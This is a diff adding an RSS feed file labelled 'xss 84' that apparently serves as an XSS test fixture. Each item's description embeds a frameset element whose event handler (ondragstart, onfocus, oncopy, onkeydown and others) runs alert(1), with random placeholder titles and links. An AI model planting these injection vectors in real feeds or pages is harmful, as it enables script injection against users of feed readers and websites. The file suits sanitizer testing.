@@ -1,0 +1,183 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+<channel>
+  <title>xss 84</title>
+  <link>https://www.LCUTYAJPZNJMKXDSBVGA.com</link>
+  <description>ZJYCWBMJZBLCKHOYOEWT</description>
+  <item>
+    <title>MTAIXTZOMCKQYHYQFPGP</title>
+    <link>http://wwww.INYJNMJJUUQZOXELHIBRFRXCMFKAEWLHOBTXUYUU.com</link>
+    <description>
+      <frameset draggable="true" ondragend="alert(1)">test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>CANYQKXNZRWCCOMOBGBL</title>
+    <link>http://wwww.VZNSDHMAETTKWUCFZWJWSLKDLMQCDFSARBNPCULJ.com</link>
+    <description>
+      <frameset draggable="true" ondragenter="alert(1)">test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>UAEEKZPSHPQTRHGOTEMQ</title>
+    <link>http://wwww.TEXQECPSYDAQOCZTNEHGVDPDRVDKTMTLCDOJSCWO.com</link>
+    <description>
+      <frameset draggable="true" ondragleave="alert(1)">test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>NNGNNMVJQVMWHSGXODKE</title>
+    <link>http://wwww.JZFIYUJZBHLCXKAAEMPPBYPIGEZATLWRLOQDEMMJ.com</link>
+    <description>
+      <frameset draggable="true" ondragstart="alert(1)">test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>QIQJFNXAHQBTYBDGZPKU</title>
+    <link>http://wwww.JQCQPVELSQPCEABXEATQNTJDWFYPUCZLQJEZUQPO.com</link>
+    <description>
+      <frameset   onactivate=alert(1)></frameset>
+    </description>
+  </item>
+  <item>
+    <title>MERMWSQJHZWTYDDUIVCF</title>
+    <link>http://wwww.CUEJORZZVJJGTDILCZPINBPDMJRMPLSMKUTSTJWD.com</link>
+    <description>
+      <frameset   onbeforeactivate=alert(1)></frameset>
+    </description>
+  </item>
+  <item>
+    <title>ZKCGREAQNASIYYQEJISV</title>
+    <link>http://wwww.GDWHLFAQFQDULSWFYXHKGXHLNRSGIYZPNBKVOWIN.com</link>
+    <description>
+      <frameset   onbeforedeactivate=alert(1)></frameset><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>NASQFCPJALMAHTELULPI</title>
+    <link>http://wwww.BMMDTSZSPROIECMXULCBAMMEFDFJCTCIYIZPIPUK.com</link>
+    <description>
+      <frameset   ondeactivate=alert(1)></frameset><input id=y autofocus>
+    </description>
+  </item>
+  <item>
+    <title>WVBYRZGGPNDENHUZWALW</title>
+    <link>http://wwww.ZUJQXWTCDVNIGNSPLQQEXCVIHXOFADMDLPKFZNOG.com</link>
+    <description>
+      <frameset   onfocus=alert(1)></frameset>
+    </description>
+  </item>
+  <item>
+    <title>LAWQBJGUDIRVMNMTSLTO</title>
+    <link>http://wwww.RJFRFTTQURVHNUUCMUQIIOEYKQXFQNRXMBSNHILF.com</link>
+    <description>
+      <frameset   onfocusin=alert(1)></frameset>
+    </description>
+  </item>
+  <item>
+    <title>FMRQAJULJFAFFFBUDDQY</title>
+    <link>http://wwww.PCPARBERLGSECQGGUNKYFEEOFPEOUYQMFFRVMMMG.com</link>
+    <description>
+      <frameset onbeforecopy="alert(1)" contenteditable>test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>CCWGAXGUNDVISCFPBCWE</title>
+    <link>http://wwww.SQFZUGEEIGPQNHBXDXOHLIIAMKNWPCEBXBJOQEMO.com</link>
+    <description>
+      <frameset onbeforecut="alert(1)" contenteditable>test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>AKVJCHSMWBLJTRNEFQQU</title>
+    <link>http://wwww.WBNWWAEECKRQUXXAHQIJVBHLNDWRZQSWMKSRCJFR.com</link>
+    <description>
+      <frameset onbeforepaste="alert(1)" contenteditable>test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>PWMWXZOJRIZEGKXVGTJF</title>
+    <link>http://wwww.XXJPNMDMGVOAFNTEBKQHCIXBMHSXJRKIJRBRHWRB.com</link>
+    <description>
+      <frameset onblur=alert(1)  ></frameset><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>ZVHBEZKFXDCSFRTMWEZO</title>
+    <link>http://wwww.FBRQKDOXYEZMTGFKDDNUIPOLNNWZKAILVZOGBSSV.com</link>
+    <description>
+      <frameset onclick="alert(1)">test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>NIJOGSUHCMMWUDKIOPCQ</title>
+    <link>http://wwww.FEYFKGEIRUHJLJFRKIDVRWBRAWZSRFOCAAEJRQIA.com</link>
+    <description>
+      <frameset oncontextmenu="alert(1)">test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>JBBALWGLIPPXMFYEJGDD</title>
+    <link>http://wwww.FCTEWHIJVRKLHRVUUZDDFZEKUFMWCSMBFNZXAIXV.com</link>
+    <description>
+      <frameset oncopy="alert(1)" contenteditable>test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>NOAIXOLPRAWCEOUDSKAP</title>
+    <link>http://wwww.PXDFMXOTDOUCFDLBUXMYEFMFIUCRGZSSAAJWJQDD.com</link>
+    <description>
+      <frameset oncut="alert(1)" contenteditable>test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>GXQEVUCTSSLFBMZVQNSE</title>
+    <link>http://wwww.UPPAZDMRORFSJBLHJRCCLKYMHWOPONUHRLVRDDEM.com</link>
+    <description>
+      <frameset ondblclick="alert(1)">test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>URZMVVWHOLHILWGEACZV</title>
+    <link>http://wwww.HRGSXLTSRKXZRBZVLUSNUMOGWSLOLCQVIQYPQNHV.com</link>
+    <description>
+      <frameset onfocusout=alert(1)  ></frameset><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>QOBUABDWOQXPVSGBEYWT</title>
+    <link>http://wwww.KSCEBWGCLNWDCEEZMUDORMTFNSAZBSQYTYPBUNKD.com</link>
+    <description>
+      <frameset onkeydown="alert(1)" contenteditable>test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>AOXTINPFRCIYJEQULJFR</title>
+    <link>http://wwww.QLUZYIQYIDEXIQBZUCFXKTDPSCEWPROEMNICUYEY.com</link>
+    <description>
+      <frameset onkeypress="alert(1)" contenteditable>test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>TDZYVGJNKTMEBCTARUSH</title>
+    <link>http://wwww.KUBMXWNRJDJMCNMWVFHNUNCXSUOEJUQHNXIIGMQO.com</link>
+    <description>
+      <frameset onkeyup="alert(1)" contenteditable>test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>NEJHRITAGAVIJTCKAZCC</title>
+    <link>http://wwww.NDYMBBBZUGFIJBVSUNHYJYIDVWHWHDPDBOKKMXVG.com</link>
+    <description>
+      <frameset onmousedown="alert(1)">test</frameset>
+    </description>
+  </item>
+  <item>
+    <title>EKQEERHCLJPFXHDOGRXV</title>
+    <link>http://wwww.KOWHVKLWKWZQPFJEPUZPZHPTKRSIXSNIEDBTUAST.com</link>
+    <description>
+      <frameset onmouseenter="alert(1)">test</frameset>
+    </description>
+  </item>
+</channel>
+</rss>
